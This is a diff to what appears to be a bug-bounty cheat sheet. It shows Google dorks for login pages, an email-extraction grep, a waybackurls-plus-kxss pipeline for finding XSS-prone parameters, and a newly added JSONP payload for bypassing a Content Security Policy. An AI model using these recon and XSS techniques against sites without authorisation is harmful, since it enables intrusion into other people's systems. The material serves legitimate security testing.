@@ -42,6 +42,7 @@ Finding hidden directory’s
 ```
 4-
 ```inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:test.com```
+
 5-find emails
 ```
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b" file.txt
@@ -99,6 +100,10 @@ Reasons:
 8-waybackurls+ kxss
 ```
 waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls-xss.txt | sort -u -o urls-xss.txt && cat urls-xss.txt | kxss
+```
+9-CSP bypass
+```
+www.google.com/complete/search?client=chrome&q=1&jsonp=alert(1)//
 ```
 # SSRF
 1-Try other URL schemes:<br>
